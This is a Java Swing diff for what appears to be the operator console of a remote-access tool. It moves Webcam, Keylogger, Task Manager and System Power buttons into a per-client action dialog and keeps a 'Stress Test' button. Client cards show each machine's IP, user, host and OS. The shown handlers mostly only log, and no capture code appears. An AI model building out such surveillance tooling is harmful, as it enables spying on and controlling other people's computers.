@@ -131,11 +131,11 @@ public class AdminServerApp extends JFrame {
         sidebar.add(Box.createVerticalStrut(22));
 
         sidebar.add(createMenuButton("Dashboard", "Dashboard.png", true));
-        sidebar.add(createMenuButton("Webcam", "webcam.png", false));
-        sidebar.add(createMenuButton("Keylogger", "keyboard.png", false));
-        sidebar.add(createMenuButton("Task Manager", "task.png", false));
-        sidebar.add(createMenuButton("File Explorer", "file.png", false));
-        sidebar.add(createMenuButton("System Power", "power.png", false));
+        //sidebar.add(createMenuButton("Webcam", "webcam.png", false));
+        //sidebar.add(createMenuButton("Keylogger", "keyboard.png", false));
+        //sidebar.add(createMenuButton("Task Manager", "task.png", false));
+        //sidebar.add(createMenuButton("File Explorer", "file.png", false));
+        //sidebar.add(createMenuButton("System Power", "power.png", false));
         sidebar.add(createMenuButton("Stress Test", "stress.png", false));
 
         sidebar.add(Box.createVerticalGlue());
@@ -445,10 +445,10 @@ public class AdminServerApp extends JFrame {
         infoPanel.setBackground(PANEL);
         infoPanel.setBorder(BorderFactory.createEmptyBorder(10, 0, 0, 0));
 
-        infoPanel.add(createInfoLabel("◎ IP: " + ip, TEXT));
-        infoPanel.add(createInfoLabel("◈ User: " + username, RED));
-        infoPanel.add(createInfoLabel("▦ Host: " + hostname, TEXT));
-        infoPanel.add(createInfoLabel("◴ OS: " + os, TEXT));
+        infoPanel.add(createInfoLabel(" IP: " + ip, TEXT));
+        infoPanel.add(createInfoLabel(" User: " + username, RED));
+        infoPanel.add(createInfoLabel(" Host: " + hostname, TEXT));
+        infoPanel.add(createInfoLabel(" OS: " + os, TEXT));
 
         card.add(top, BorderLayout.NORTH);
         card.add(preview, BorderLayout.CENTER);
@@ -456,8 +456,8 @@ public class AdminServerApp extends JFrame {
         card.addMouseListener(new MouseAdapter() {
             public void mouseClicked(MouseEvent e) {
                 if (e.getClickCount() == 2) {
-                    addLog("[SCREEN] Open big screen for " + clientName);
-                    openBigScreen(clientName);
+                    addLog("[SCREEN] Open big action panel for " + clientName);
+                    openClientActionDialog(clientName);
                 }
             }
 
@@ -1016,6 +1016,71 @@ public void removeClientCard(String clientName) {
             );
         }
     });
+}
+    private void openClientActionDialog(String clientName) {
+    JDialog dialog = new JDialog(this, "Client Actions - " + clientName, false);
+    dialog.setSize(420, 420);
+    dialog.setLocationRelativeTo(this);
+    dialog.setLayout(new BorderLayout());
+    dialog.getContentPane().setBackground(BG);
+
+    JLabel title = new JLabel("  ACTIONS FOR " + clientName);
+    title.setForeground(TEXT);
+    title.setFont(new Font("Segoe UI", Font.BOLD, 20));
+    title.setOpaque(true);
+    title.setBackground(BG);
+    title.setBorder(BorderFactory.createCompoundBorder(
+            BorderFactory.createMatteBorder(1, 1, 1, 1, RED),
+            BorderFactory.createEmptyBorder(14, 18, 14, 18)
+    ));
+
+    JPanel actionPanel = new JPanel(new GridLayout(4, 2, 12, 12));
+    actionPanel.setBackground(BG);
+    actionPanel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
+
+    JButton screenBtn = createRedButton("Screen Monitor");
+    JButton webcamBtn = createDarkButton("Webcam");
+    JButton keyloggerBtn = createDarkButton("Keylogger");
+    JButton taskBtn = createDarkButton("Task Manager");
+    JButton powerBtn = createDarkButton("System Power");
+    JButton closeBtn = createDarkButton("Close");
+
+    screenBtn.addActionListener(e -> {
+        addLog("[SCREEN] Open screen for " + clientName);
+        openBigScreen(clientName);
+    });
+
+    webcamBtn.addActionListener(e -> {
+        addLog("[WEBCAM] Open webcam for " + clientName);
+    });
+
+    keyloggerBtn.addActionListener(e -> {
+        addLog("[KEYLOGGER] Open keylogger for " + clientName);
+    });
+
+    taskBtn.addActionListener(e -> {
+        addLog("[TASK] Open task manager for " + clientName);
+    });
+
+
+    powerBtn.addActionListener(e -> {
+        addLog("[POWER] Open power control for " + clientName);
+    });
+
+
+    closeBtn.addActionListener(e -> dialog.dispose());
+
+    actionPanel.add(screenBtn);
+    actionPanel.add(webcamBtn);
+    actionPanel.add(keyloggerBtn);
+    actionPanel.add(taskBtn);
+    actionPanel.add(powerBtn);
+    actionPanel.add(closeBtn);
+
+    dialog.add(title, BorderLayout.NORTH);
+    dialog.add(actionPanel, BorderLayout.CENTER);
+
+    dialog.setVisible(true);
 }
 
 
